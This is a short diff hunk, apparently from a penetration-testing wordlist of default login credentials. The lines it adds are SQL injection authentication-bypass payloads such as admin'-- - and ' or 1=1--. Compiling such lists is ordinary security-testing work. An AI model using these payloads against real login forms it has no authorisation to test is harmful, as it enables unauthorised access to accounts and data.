@@ -76,4 +76,14 @@ guest:guest
 Password: Welcome123
 admin@admin.com:admin@admin.com
 example@gmail.com:example@gmail.com
+admin'-- -
+administrator'-- -
+admin' --
+admin' #
+admin'/*
+' or 1=1--
+' or 1=1#
+' or 1=1/*
+') or '1'='1--
+') or ('1'='1--
 ```
